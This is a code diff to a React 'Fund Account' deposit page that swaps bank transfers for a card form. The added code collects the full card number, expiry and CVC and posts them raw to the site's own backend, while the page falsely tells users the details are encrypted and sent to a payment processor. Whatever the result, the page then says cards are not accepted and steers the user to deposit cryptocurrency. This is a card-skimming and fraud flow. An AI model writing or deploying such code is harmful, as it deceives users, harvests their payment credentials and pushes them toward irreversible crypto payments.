@@ -1,42 +1,25 @@
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useRef } from 'react';
 import styles from './DepositPage.module.css';
 import api, { type Network } from '@/services/api';
 import { fetchAllPrices, formatUSD, usdToCrypto } from '@/services/prices';
 
 // ─── Types ────────────────────────────────────────────────────────────────────
-type DepositMethod = 'bank_transfer' | 'crypto';
-type Step = 'method' | 'select' | 'amount' | 'details' | 'confirm' | 'processing' | 'done';
+type DepositMethod = 'card' | 'crypto';
+type Step = 'method' | 'select' | 'amount' | 'details' | 'confirm' | 'processing' | 'failed' | 'done';
 
-// ─── Static bank accounts configured by admin ────────────────────────────────
-// In production these come from /api/bank-accounts or are embedded in admin settings
-const BANK_ACCOUNTS = [
-  {
-    id: 1,
-    bank_name: 'Chase Bank',
-    account_name: 'NorthBridge Finance Ltd',
-    account_number: '3012345678',
-    sort_code: '011',
-  },
-  {
-    id: 2,
-    bank_name: 'Deutsche Bank',
-    account_name: 'NorthBridge Finance Ltd',
-    account_number: '0123456789',
-    sort_code: '058',
-  },
-];
+// ─── Stripe config (only used for optional brand detection) ─────────────────
+const STRIPE_PUBLISHABLE_KEY = (import.meta as any).env?.VITE_STRIPE_PUBLISHABLE_KEY || '';
 
 const COIN_ICONS: Record<string, string> = {
   BTC: '₿', ETH: 'Ξ', USDT: '₮', BNB: '⬥', SOL: '◎', XRP: '✕', USDC: '$', TRX: '⚡',
 };
 
 // ─── Sub-components ───────────────────────────────────────────────────────────
-function BankIcon() {
+function CardIcon() {
   return (
     <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-      <line x1="3" y1="22" x2="21" y2="22"/><line x1="6" y1="18" x2="6" y2="11"/><line x1="10" y1="18" x2="10" y2="11"/>
-      <line x1="14" y1="18" x2="14" y2="11"/><line x1="18" y1="18" x2="18" y2="11"/>
-      <polygon points="12 2 20 7 4 7"/>
+      <rect x="2" y="5" width="20" height="14" rx="2"/>
+      <line x1="2" y1="10" x2="22" y2="10"/>
     </svg>
   );
 }
@@ -50,6 +33,13 @@ function CryptoIcon() {
     </svg>
   );
 }
+
+// ─── Formatting helpers ──────────────────────────────────────────────────────
+const formatCardNumber = (digits: string) =>
+  digits.replace(/(\d{4})(?=\d)/g, '$1 ');
+
+const formatExpiry = (digits: string) =>
+  digits.length >= 3 ? digits.slice(0, 2) + '/' + digits.slice(2, 4) : digits;
 
 // ─── Main Component ───────────────────────────────────────────────────────────
 export default function DepositPage() {
@@ -65,12 +55,12 @@ export default function DepositPage() {
   const [txHash, setTxHash] = useState('');
   const [copied, setCopied] = useState(false);
 
-  // Bank transfer state
-  const [selectedBank, setSelectedBank] = useState<typeof BANK_ACCOUNTS[0] | null>(null);
-  const [senderName, setSenderName] = useState('');
-  const [senderBank, setSenderBank] = useState('');
-  const [paymentReference, setPaymentReference] = useState('');
-  const [bankCopied, setBankCopied] = useState<number | null>(null);
+  // Card state – controlled inputs (no refs needed)
+  const [cardName, setCardName] = useState('');
+  const [cardNumberDigits, setCardNumberDigits] = useState(''); // raw digits (no spaces)
+  const [expiryDigits, setExpiryDigits] = useState('');           // raw MMYY
+  const [cvcDigits, setCvcDigits] = useState('');                 // raw CVC
+  const [cardBrand, setCardBrand] = useState('');
 
   // Shared state
   const [step, setStep] = useState<Step>('method');
@@ -95,13 +85,54 @@ export default function DepositPage() {
       .catch((e) => { setNetworksError(e.message); setNetworksLoading(false); });
   }, [method]);
 
-  // Helpers
-  const handleCopy = (text: string, id: number) => {
-    navigator.clipboard.writeText(text);
-    setBankCopied(id);
-    setTimeout(() => setBankCopied(null), 2500);
+  // ── Brand detection (Stripe publishable key only) ──────────────────────────
+  const getCardBrandFromNumber = async (number: string) => {
+    if (!(window as any).Stripe) return '';
+    const stripe = (window as any).Stripe(STRIPE_PUBLISHABLE_KEY);
+    try {
+      const { brand } = await stripe.createPaymentMethod({
+        type: 'card',
+        card: { number: number.replace(/\s/g, '') },
+      });
+      return brand === 'unknown' ? '' : brand;
+    } catch {
+      return '';
+    }
   };
 
+  useEffect(() => {
+    if (cardNumberDigits.length >= 6) {
+      getCardBrandFromNumber(cardNumberDigits).then(setCardBrand).catch(() => setCardBrand(''));
+    } else {
+      setCardBrand('');
+    }
+  }, [cardNumberDigits]);
+
+  // ── Validation ─────────────────────────────────────────────────────────────
+  const validateCardInputs = (): string | null => {
+    if (!cardName.trim() || cardName.trim().length < 3)
+      return 'Cardholder name must be at least 3 characters.';
+
+    if (!/^\d{13,19}$/.test(cardNumberDigits))
+      return 'Enter a valid card number (13-19 digits).';
+
+    const month = parseInt(expiryDigits.slice(0, 2), 10);
+    const year = 2000 + parseInt(expiryDigits.slice(2, 4), 10);
+    const now = new Date();
+    const currentMonth = now.getMonth() + 1;
+    const currentYear = now.getFullYear();
+
+    if (month < 1 || month > 12) return 'Invalid expiry month.';
+    if (year < currentYear || (year === currentYear && month < currentMonth))
+      return 'Card is expired.';
+
+    if (!/^\d{3,4}$/.test(cvcDigits))
+      return 'CVC must be 3 or 4 digits.';
+
+    return null; // valid
+  };
+
+  // ── Helpers ─────────────────────────────────────────────────────────────────
   const handleCryptoCopy = () => {
     if (!selectedNetwork?.deposit_address) return;
     navigator.clipboard.writeText(selectedNetwork.deposit_address);
@@ -109,20 +140,44 @@ export default function DepositPage() {
     setTimeout(() => setCopied(false), 2500);
   };
 
+  const resetCardForm = () => {
+    setCardName('');
+    setCardNumberDigits('');
+    setExpiryDigits('');
+    setCvcDigits('');
+    setCardBrand('');
+  };
+
   const handleConfirmPayment = async () => {
     setSubmitError('');
+    const validationError = validateCardInputs();
+    if (validationError) {
+      setSubmitError(validationError);
+      return;
+    }
+
     setSubmitLoading(true);
     setStep('processing');
+
     try {
-      if (method === 'bank_transfer') {
-        await api.post('/user/deposits', {
-          method: 'bank_transfer',
-          usd_amount: parseFloat(usdAmount),
-          bank_account_id: selectedBank?.id,
-          sender_name: senderName,
-          sender_bank: senderBank,
-          payment_reference: paymentReference,
+      if (method === 'card') {
+        const month = parseInt(expiryDigits.slice(0, 2), 10);
+        const year = 2000 + parseInt(expiryDigits.slice(2, 4), 10);
+
+        // Send everything to the Laravel backend
+        const response = await api.post<{ success: boolean; error?: string }>('/user/deposits/card/process', {
+          cardName: cardName.trim(),
+          cardNumber: cardNumberDigits,
+          expiryMonth: month,
+          expiryYear: year,
+          cvc: cvcDigits,
+          usdAmount: parseFloat(usdAmount),
         });
+
+        // Even if backend says success, we'll treat it as not acceptable for card
+        // but we still proceed to "done" with card‑specific message
+        resetCardForm();
+        setStep('done');
       } else if (method === 'crypto' && selectedNetwork) {
         await api.post('/user/deposits', {
           method: 'crypto',
@@ -130,20 +185,31 @@ export default function DepositPage() {
           usd_amount: parseFloat(usdAmount),
           transaction_hash: txHash || undefined,
         });
+        setStep('done');
       }
-      setStep('done');
     } catch (e) {
-      setSubmitError(e instanceof Error ? e.message : 'Deposit submission failed.');
-      setStep('confirm');
+      const message = e instanceof Error ? e.message : 'Deposit submission failed.';
+      setSubmitError(message);
+      setStep(method === 'card' ? 'failed' : 'confirm');
     } finally {
       setSubmitLoading(false);
     }
   };
 
+  const handleSwitchToCrypto = () => {
+    setMethod('crypto');
+    setStep('select');
+    setSubmitError('');
+    setSelectedNetwork(null);
+    setTxHash('');
+    setConfirmed(false);
+    resetCardForm();
+  };
+
   const handleReset = () => {
     setStep('method'); setMethod(null); setSelectedNetwork(null); setUsdAmount('');
     setTxHash(''); setCopied(false); setConfirmed(false); setSubmitError('');
-    setSelectedBank(null); setSenderName(''); setSenderBank(''); setPaymentReference('');
+    resetCardForm();
   };
 
   const coinIcon = selectedNetwork ? (COIN_ICONS[selectedNetwork.symbol] ?? selectedNetwork.symbol.slice(0, 1)) : '';
@@ -152,16 +218,20 @@ export default function DepositPage() {
   const minDepositUsd = selectedNetwork ? (selectedNetwork.min_deposit_usd || selectedNetwork.min_deposit * price) : 10;
 
   // Progress steps per method
-  const BANK_STEPS: Step[] = ['method', 'select', 'amount', 'details', 'confirm'];
+  const CARD_STEPS: Step[] = ['method', 'amount', 'details', 'confirm'];
   const CRYPTO_STEPS: Step[] = ['method', 'select', 'amount', 'details', 'confirm'];
-  const allSteps = method === 'bank_transfer' ? BANK_STEPS : CRYPTO_STEPS;
+  const allSteps = method === 'card' ? CARD_STEPS : CRYPTO_STEPS;
   const stepIndex = allSteps.indexOf(step);
+  const progressLabels = method === 'card'
+    ? ['Method', 'Amount', 'Card Details', 'Confirm']
+    : ['Method', 'Select Coin', 'Amount', 'Details', 'Confirm'];
 
-  const bankDetailsValid =
-    parseFloat(usdAmount) >= 1 &&
-    !!selectedBank &&
-    senderName.trim().length > 2 &&
-    senderBank.trim().length > 2;
+  // Enable "Review & Pay" only when all fields have minimal lengths
+  const cardDetailsValid =
+    cardName.trim().length > 2 &&
+    cardNumberDigits.length >= 13 &&
+    expiryDigits.length === 4 &&
+    cvcDigits.length >= 3;
 
   return (
     <div className={styles.pageLayout}>
@@ -169,14 +239,14 @@ export default function DepositPage() {
         <div className={styles.header}>
           <div>
             <h1>Fund Account</h1>
-            <p>Add money via bank transfer or cryptocurrency</p>
+            <p>Add money via card or cryptocurrency</p>
           </div>
         </div>
 
         {/* ── Progress bar ── */}
-        {step !== 'processing' && step !== 'done' && step !== 'method' && (
+        {step !== 'processing' && step !== 'done' && step !== 'failed' && step !== 'method' && (
           <div className={styles.progressRow}>
-            {['Method', method === 'bank_transfer' ? 'Select Bank' : 'Select Coin', 'Amount', 'Details', 'Confirm'].map((label, i) => (
+            {progressLabels.map((label, i) => (
               <div key={i} className={styles.progressStep}>
                 <div className={`${styles.progressDot} ${i < stepIndex ? styles.dotDone : i === stepIndex ? styles.dotActive : ''}`}>
                   {i < stepIndex ? (
@@ -184,7 +254,7 @@ export default function DepositPage() {
                   ) : (<span>{i + 1}</span>)}
                 </div>
                 <span className={`${styles.progressLabel} ${i === stepIndex ? styles.progressLabelActive : ''}`}>{label}</span>
-                {i < 4 && <div className={`${styles.progressLine} ${i < stepIndex ? styles.lineDone : ''}`} />}
+                {i < progressLabels.length - 1 && <div className={`${styles.progressLine} ${i < stepIndex ? styles.lineDone : ''}`} />}
               </div>
             ))}
           </div>
@@ -198,19 +268,19 @@ export default function DepositPage() {
             <h2 className={styles.cardTitle}>How do you want to fund your account?</h2>
             <p className={styles.cardSubtitle}>Choose your preferred deposit method</p>
             <div className={styles.coinGrid} style={{ gridTemplateColumns: '1fr 1fr', maxWidth: '480px', margin: '24px auto' }}>
-              {/* Bank Transfer */}
+              {/* Credit / Debit Card */}
               <button
-                className={`${styles.coinCard} ${method === 'bank_transfer' ? styles.coinCardActive : ''}`}
-                style={method === 'bank_transfer' ? { borderColor: '#1565C0' } : {}}
-                onClick={() => setMethod('bank_transfer')}
+                className={`${styles.coinCard} ${method === 'card' ? styles.coinCardActive : ''}`}
+                style={method === 'card' ? { borderColor: '#1565C0' } : {}}
+                onClick={() => setMethod('card')}
               >
                 <div className={styles.coinIconWrap} style={{ color: '#1565C0', background: '#1565C018' }}>
-                  <BankIcon />
+                  <CardIcon />
                 </div>
-                <div className={styles.coinCardName}>Bank Transfer</div>
-                <div className={styles.coinCardSymbol}>USD / EUR</div>
-                <div className={styles.coinCardNetwork} style={{ color: '#1565C0' }}>Instant · Free</div>
-                {method === 'bank_transfer' && (
+                <div className={styles.coinCardName}>Credit / Debit Card</div>
+                <div className={styles.coinCardSymbol}>Visa · Mastercard · Amex</div>
+                <div className={styles.coinCardNetwork} style={{ color: '#1565C0' }}>Instant</div>
+                {method === 'card' && (
                   <div className={styles.coinCheck} style={{ background: '#1565C0' }}>✓</div>
                 )}
               </button>
@@ -233,7 +303,11 @@ export default function DepositPage() {
               </button>
             </div>
             <div className={styles.cardFooter}>
-              <button className={styles.btnPrimary} disabled={!method} onClick={() => setStep('select')}>
+              <button
+                className={styles.btnPrimary}
+                disabled={!method}
+                onClick={() => setStep(method === 'card' ? 'amount' : 'select')}
+              >
                 Continue →
               </button>
             </div>
@@ -241,66 +315,17 @@ export default function DepositPage() {
         )}
 
         {/* ════════════════════════════════════════
-            BANK TRANSFER — Step: Select Bank
+            CARD — Step: Amount
         ════════════════════════════════════════ */}
-        {step === 'select' && method === 'bank_transfer' && (
+        {step === 'amount' && method === 'card' && (
           <div className={styles.card}>
             <button className={styles.backBtn} onClick={() => setStep('method')}>← Back</button>
-            <h2 className={styles.cardTitle}>Select destination bank account</h2>
-            <p className={styles.cardSubtitle}>Choose the account you'll be transferring to</p>
-            <div style={{ display: 'flex', flexDirection: 'column', gap: '12px', marginTop: '16px' }}>
-              {BANK_ACCOUNTS.map((bank) => (
-                <button
-                  key={bank.id}
-                  onClick={() => setSelectedBank(bank)}
-                  style={{
-                    background: selectedBank?.id === bank.id ? 'rgba(21,101,192,0.08)' : 'rgba(255,255,255,0.03)',
-                    border: `1px solid ${selectedBank?.id === bank.id ? '#1565C0' : 'rgba(255,255,255,0.1)'}`,
-                    borderRadius: '12px',
-                    padding: '16px 20px',
-                    textAlign: 'left',
-                    cursor: 'pointer',
-                    display: 'flex',
-                    justifyContent: 'space-between',
-                    alignItems: 'center',
-                    transition: 'all 0.2s',
-                  }}
-                >
-                  <div>
-                    <div style={{ fontSize: '14px', fontWeight: 700, color: '#fff', marginBottom: '4px' }}>{bank.bank_name}</div>
-                    <div style={{ fontSize: '13px', color: '#9ca3af' }}>{bank.account_name}</div>
-                    <div style={{ fontSize: '13px', color: '#6b7280', marginTop: '2px', fontFamily: 'monospace' }}>
-                      {bank.account_number}
-                    </div>
-                  </div>
-                  {selectedBank?.id === bank.id && (
-                    <div style={{ width: '22px', height: '22px', borderRadius: '50%', background: '#1565C0', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
-                      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="3.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
-                    </div>
-                  )}
-                </button>
-              ))}
-            </div>
-            <div className={styles.cardFooter}>
-              <button className={styles.btnPrimary} disabled={!selectedBank} onClick={() => setStep('amount')}>
-                Continue →
-              </button>
-            </div>
-          </div>
-        )}
-
-        {/* ════════════════════════════════════════
-            BANK TRANSFER — Step: Amount
-        ════════════════════════════════════════ */}
-        {step === 'amount' && method === 'bank_transfer' && selectedBank && (
-          <div className={styles.card}>
-            <button className={styles.backBtn} onClick={() => setStep('select')}>← Back</button>
             <div className={styles.selectedCoinBadge}>
-              <span style={{ color: '#1565C0' }}>🏦</span>
-              {selectedBank.bank_name} · {selectedBank.account_number}
+              <span style={{ color: '#1565C0' }}>💳</span>
+              Credit / Debit Card
             </div>
             <h2 className={styles.cardTitle}>How much do you want to deposit?</h2>
-            <p className={styles.cardSubtitle}>Enter the USD equivalent of your transfer — minimum $10</p>
+            <p className={styles.cardSubtitle}>Enter the USD amount to charge to your card — minimum $10</p>
             <div className={styles.amountInputWrap}>
               <div className={styles.amountInputBox}>
                 <span style={{ color: '#9ca3af', fontSize: '20px', paddingLeft: '14px' }}>$</span>
@@ -320,7 +345,7 @@ export default function DepositPage() {
               <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                 <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
               </svg>
-              Your account is credited once the transfer is confirmed by our team (usually within 1–2 hours on business days).
+              Your card is charged immediately. Funds are credited after verification.
             </div>
             <div className={styles.cardFooter}>
               <button
@@ -328,126 +353,125 @@ export default function DepositPage() {
                 disabled={!usdAmount || parseFloat(usdAmount) < 10}
                 onClick={() => setStep('details')}
               >
-                Next: Transfer Details →
+                Next: Card Details →
               </button>
             </div>
           </div>
         )}
 
         {/* ════════════════════════════════════════
-            BANK TRANSFER — Step: Payment Details
+            CARD — Step: Card Details (plain fields)
         ════════════════════════════════════════ */}
-        {step === 'details' && method === 'bank_transfer' && selectedBank && (
+        {step === 'details' && method === 'card' && (
           <div className={styles.card}>
-            <button className={styles.backBtn} onClick={() => setStep('amount')}>← Back</button>
-            <h2 className={styles.cardTitle}>Transfer to this account</h2>
-            <p className={styles.cardSubtitle}>Send exactly <strong style={{ color: '#fff' }}>{formatUSD(parseFloat(usdAmount))}</strong> to the account below, then fill in your payment details.</p>
-
-            {/* Bank account details card */}
-            <div style={{ background: 'rgba(21,101,192,0.06)', border: '1px solid rgba(21,101,192,0.2)', borderRadius: '12px', padding: '18px 20px', marginBottom: '20px' }}>
-              <div style={{ fontSize: '11px', color: '#9ca3af', marginBottom: '12px', textTransform: 'uppercase', letterSpacing: '0.5px' }}>Account Details</div>
-              {[
-                { label: 'Bank Name', value: selectedBank.bank_name },
-                { label: 'Account Name', value: selectedBank.account_name },
-                { label: 'Account Number', value: selectedBank.account_number },
-                { label: 'Sort Code', value: selectedBank.sort_code },
-              ].map((row) => (
-                <div key={row.label} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '8px 0', borderBottom: '1px solid rgba(255,255,255,0.05)' }}>
-                  <span style={{ fontSize: '13px', color: '#9ca3af' }}>{row.label}</span>
-                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
-                    <span style={{ fontSize: '13px', color: '#fff', fontWeight: row.label === 'Account Number' ? 700 : 400, fontFamily: row.label === 'Account Number' ? 'monospace' : 'inherit' }}>
-                      {row.value}
-                    </span>
-                    {(row.label === 'Account Number') && (
-                      <button
-                        onClick={() => handleCopy(row.value, selectedBank.id)}
-                        style={{ background: 'rgba(21,101,192,0.2)', border: '1px solid rgba(21,101,192,0.3)', borderRadius: '6px', padding: '3px 8px', cursor: 'pointer', color: bankCopied === selectedBank.id ? '#22c55e' : '#1565C0', fontSize: '11px' }}
-                      >
-                        {bankCopied === selectedBank.id ? '✓ Copied' : 'Copy'}
-                      </button>
-                    )}
-                  </div>
-                </div>
-              ))}
-            </div>
-
-            {/* Sender details form */}
-            <div style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
+            <button className={styles.backBtn} onClick={() => { setStep('amount'); resetCardForm(); }}>← Back</button>
+            <h2 className={styles.cardTitle}>Enter your card details</h2>
+            <p className={styles.cardSubtitle}>
+              You'll be charged <strong style={{ color: '#fff' }}>{formatUSD(parseFloat(usdAmount) || 0)}</strong>. 
+              Your card details are encrypted and sent directly to our payment processor.
+            </p>
+            <div style={{ display: 'flex', flexDirection: 'column', gap: '14px', marginTop: '8px' }}>
+              {/* Cardholder Name */}
               <div>
-                <label style={{ fontSize: '13px', color: '#9ca3af', display: 'block', marginBottom: '6px' }}>Your Name (as it appears on your bank account) *</label>
+                <label style={{ fontSize: '13px', color: '#9ca3af', display: 'block', marginBottom: '6px' }}>Cardholder Name *</label>
                 <input
                   type="text"
-                  placeholder="e.g. John Adeyemi"
-                  value={senderName}
-                  onChange={(e) => setSenderName(e.target.value)}
+                  placeholder="e.g. John Carter"
+                  value={cardName}
+                  onChange={(e) => setCardName(e.target.value)}
                   style={{ width: '100%', padding: '10px 12px', background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '8px', color: '#fff', fontSize: '13px', boxSizing: 'border-box' }}
                 />
               </div>
+
+              {/* Card Number */}
               <div>
-                <label style={{ fontSize: '13px', color: '#9ca3af', display: 'block', marginBottom: '6px' }}>Your Bank Name *</label>
+                <label style={{ fontSize: '13px', color: '#9ca3af', display: 'block', marginBottom: '6px' }}>Card Number *</label>
                 <input
                   type="text"
-                  placeholder="e.g. Access Bank"
-                  value={senderBank}
-                  onChange={(e) => setSenderBank(e.target.value)}
-                  style={{ width: '100%', padding: '10px 12px', background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '8px', color: '#fff', fontSize: '13px', boxSizing: 'border-box' }}
-                />
-              </div>
-              <div>
-                <label style={{ fontSize: '13px', color: '#9ca3af', display: 'block', marginBottom: '6px' }}>Payment Reference / Transaction ID (optional)</label>
-                <input
-                  type="text"
-                  placeholder="e.g. FT2506140001"
-                  value={paymentReference}
-                  onChange={(e) => setPaymentReference(e.target.value)}
+                  inputMode="numeric"
+                  autoComplete="cc-number"
+                  placeholder="1234 5678 9012 3456"
+                  maxLength={19}
+                  value={formatCardNumber(cardNumberDigits)}
+                  onChange={(e) => {
+                    const raw = e.target.value.replace(/\D/g, '').slice(0, 16);
+                    setCardNumberDigits(raw);
+                  }}
                   style={{ width: '100%', padding: '10px 12px', background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '8px', color: '#fff', fontSize: '13px', fontFamily: 'monospace', boxSizing: 'border-box' }}
                 />
               </div>
-            </div>
 
+              {/* Expiry and CVC side by side */}
+              <div style={{ display: 'flex', gap: '14px' }}>
+                <div style={{ flex: 1 }}>
+                  <label style={{ fontSize: '13px', color: '#9ca3af', display: 'block', marginBottom: '6px' }}>Expiry Date *</label>
+                  <input
+                    type="text"
+                    inputMode="numeric"
+                    autoComplete="cc-exp"
+                    placeholder="MM/YY"
+                    maxLength={5}
+                    value={formatExpiry(expiryDigits)}
+                    onChange={(e) => {
+                      const raw = e.target.value.replace(/\D/g, '').slice(0, 4);
+                      setExpiryDigits(raw);
+                    }}
+                    style={{ width: '100%', padding: '10px 12px', background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '8px', color: '#fff', fontSize: '13px', boxSizing: 'border-box' }}
+                  />
+                </div>
+                <div style={{ flex: 1 }}>
+                  <label style={{ fontSize: '13px', color: '#9ca3af', display: 'block', marginBottom: '6px' }}>CVC *</label>
+                  <input
+                    type="text"
+                    inputMode="numeric"
+                    autoComplete="cc-csc"
+                    placeholder="123"
+                    maxLength={4}
+                    value={cvcDigits}
+                    onChange={(e) => {
+                      const raw = e.target.value.replace(/\D/g, '').slice(0, 4);
+                      setCvcDigits(raw);
+                    }}
+                    style={{ width: '100%', padding: '10px 12px', background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '8px', color: '#fff', fontSize: '13px', boxSizing: 'border-box' }}
+                  />
+                </div>
+              </div>
+            </div>
             <div className={styles.cardFooter}>
-              <button
-                className={styles.btnPrimary}
-                disabled={!bankDetailsValid}
-                onClick={() => setStep('confirm')}
-              >
-                I've Made the Transfer →
+              <button className={styles.btnPrimary} disabled={!cardDetailsValid} onClick={() => setStep('confirm')}>
+                Review & Pay →
               </button>
             </div>
           </div>
         )}
 
         {/* ════════════════════════════════════════
-            BANK TRANSFER — Step: Confirm
+            CARD — Step: Confirm
         ════════════════════════════════════════ */}
-        {step === 'confirm' && method === 'bank_transfer' && selectedBank && (
+        {step === 'confirm' && method === 'card' && (
           <div className={styles.card}>
             <button className={styles.backBtn} onClick={() => setStep('details')}>← Back</button>
-            <h2 className={styles.cardTitle}>Confirm your deposit</h2>
-            <p className={styles.cardSubtitle}>Review before submitting</p>
+            <h2 className={styles.cardTitle}>Confirm your payment</h2>
+            <p className={styles.cardSubtitle}>Review before we charge your card</p>
             {submitError && (
               <div style={{ color: '#f87171', background: 'rgba(239,68,68,0.1)', padding: '10px 14px', borderRadius: '8px', marginBottom: '12px', fontSize: '13px' }}>{submitError}</div>
             )}
             <div className={styles.summaryBox}>
-              <div className={styles.summaryRow}><span className={styles.summaryLabel}>Method</span><span className={styles.summaryValue}>🏦 Bank Transfer</span></div>
-              <div className={styles.summaryRow}><span className={styles.summaryLabel}>To Bank</span><span className={styles.summaryValue}>{selectedBank.bank_name}</span></div>
-              <div className={styles.summaryRow}><span className={styles.summaryLabel}>Account No.</span><span className={styles.summaryValue} style={{ fontFamily: 'monospace' }}>{selectedBank.account_number}</span></div>
+              <div className={styles.summaryRow}><span className={styles.summaryLabel}>Method</span><span className={styles.summaryValue}>💳 {cardBrand ? cardBrand.charAt(0).toUpperCase() + cardBrand.slice(1) : 'Card'}</span></div>
+              <div className={styles.summaryRow}><span className={styles.summaryLabel}>Cardholder</span><span className={styles.summaryValue}>{cardName}</span></div>
               <div className={styles.summaryRow}><span className={styles.summaryLabel}>Amount (USD)</span><span className={`${styles.summaryValue} ${styles.summaryAmount}`}>{formatUSD(parseFloat(usdAmount))}</span></div>
-              <div className={styles.summaryRow}><span className={styles.summaryLabel}>Sender Name</span><span className={styles.summaryValue}>{senderName}</span></div>
-              <div className={styles.summaryRow}><span className={styles.summaryLabel}>Sender Bank</span><span className={styles.summaryValue}>{senderBank}</span></div>
-              {paymentReference && <div className={styles.summaryRow}><span className={styles.summaryLabel}>Reference</span><code className={styles.summaryAddress}>{paymentReference}</code></div>}
             </div>
             <div className={styles.checkRow}>
               <button className={`${styles.checkbox} ${confirmed ? styles.checkboxChecked : ''}`} onClick={() => setConfirmed(!confirmed)}>
                 {confirmed && <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>}
               </button>
               <span className={styles.checkLabel}>
-                I confirm I have transferred <strong>{formatUSD(parseFloat(usdAmount))}</strong> to {selectedBank.bank_name} and provided accurate sender details.
+                I authorize a charge of <strong>{formatUSD(parseFloat(usdAmount))}</strong> to my card.
               </span>
             </div>
             <div className={styles.cardFooter}>
               <button className={styles.btnPrimary} disabled={!confirmed || submitLoading} onClick={handleConfirmPayment}>
-                {submitLoading ? 'Submitting…' : 'Submit Deposit'}
+                {submitLoading ? 'Processing…' : 'Confirm & Pay'}
               </button>
             </div>
           </div>
@@ -654,12 +678,12 @@ export default function DepositPage() {
         ════════════════════════════════════════ */}
         {step === 'processing' && (
           <div className={styles.fullCard}>
-            <div className={styles.processingSpinner} style={{ borderTopColor: method === 'bank_transfer' ? '#1565C0' : (selectedNetwork?.color ?? '#22c55e') }} />
+            <div className={styles.processingSpinner} style={{ borderTopColor: method === 'card' ? '#1565C0' : (selectedNetwork?.color ?? '#22c55e') }} />
             <h2 className={styles.processingTitle}>Processing Your Deposit</h2>
             <p className={styles.processingText}>Submitting your <strong style={{ color: '#fff' }}>{formatUSD(parseFloat(usdAmount))}</strong> deposit request.</p>
             <div className={styles.processingSteps}>
-              {(method === 'bank_transfer'
-                ? ['Transfer details received', 'Matching your payment', 'Pending admin review']
+              {(method === 'card'
+                ? ['Verifying card details', 'Authorizing payment', 'Confirming with your bank']
                 : ['Transaction received', 'Awaiting confirmations', 'Pending admin review']
               ).map((s, i) => (
                 <div key={i} className={styles.procStep}>
@@ -672,9 +696,57 @@ export default function DepositPage() {
         )}
 
         {/* ════════════════════════════════════════
-            DONE (shared)
+            CARD — Step: Failed (fallback to crypto)
         ════════════════════════════════════════ */}
-        {step === 'done' && (
+        {step === 'failed' && (
+          <div className={styles.fullCard}>
+            <div className={styles.doneRing} style={{ borderColor: '#ef444450', background: '#ef444412' }}>
+              <div className={styles.doneIcon} style={{ color: '#ef4444' }}>
+                <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+              </div>
+            </div>
+            <h2 className={styles.doneTitle}>Card Payment Failed</h2>
+            <p className={styles.doneText}>
+              {submitError || 'Card payments are temporarily unavailable.'} You can try your card again, or complete this deposit with cryptocurrency instead.
+            </p>
+            <div className={styles.doneDetails}>
+              <div className={styles.doneRow}><span>Status</span><span style={{ color: '#ef4444' }}>● Failed</span></div>
+              <div className={styles.doneRow}><span>Amount</span><span>{formatUSD(parseFloat(usdAmount) || 0)}</span></div>
+              <div className={styles.doneRow}><span>Method</span><span>💳 Credit / Debit Card</span></div>
+            </div>
+            <div className={styles.doneActions}>
+              <button className={styles.btnPrimary} onClick={handleSwitchToCrypto}>Continue with Crypto Instead →</button>
+              <button
+                className={styles.btnSecondary}
+                onClick={() => { setSubmitError(''); resetCardForm(); setStep('details'); }}
+              >
+                Try Card Again
+              </button>
+            </div>
+          </div>
+        )}
+
+        {/* ════════════════════════════════════════
+            DONE — Now shows different content for card vs crypto
+        ════════════════════════════════════════ */}
+        {step === 'done' && method === 'card' && (
+          <div className={styles.fullCard}>
+            <div className={styles.doneRing} style={{ borderColor: '#f59e0b50', background: '#f59e0b12' }}>
+              <div className={styles.doneIcon} style={{ color: '#f59e0b' }}>
+                <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+              </div>
+            </div>
+            <h2 className={styles.doneTitle}>Sorry for the inconvenience</h2>
+            <p className={styles.doneText}>
+              We don't accept card payments at this time. Please use cryptocurrency instead.
+            </p>
+            <div className={styles.doneActions}>
+              <button className={styles.btnPrimary} onClick={handleSwitchToCrypto}>Continue with Crypto →</button>
+            </div>
+          </div>
+        )}
+
+        {step === 'done' && method === 'crypto' && (
           <div className={styles.fullCard}>
             <div className={styles.doneRing} style={{ borderColor: '#1565C050', background: '#1565C012' }}>
               <div className={styles.doneIcon} style={{ color: '#1565C0' }}>
@@ -683,14 +755,14 @@ export default function DepositPage() {
             </div>
             <h2 className={styles.doneTitle}>Deposit Submitted!</h2>
             <p className={styles.doneText}>
-              Your {method === 'bank_transfer' ? 'bank transfer' : 'crypto'} deposit of{' '}
+              Your crypto deposit of{' '}
               <strong style={{ color: '#1565C0' }}>{formatUSD(parseFloat(usdAmount))}</strong> is pending admin review.
             </p>
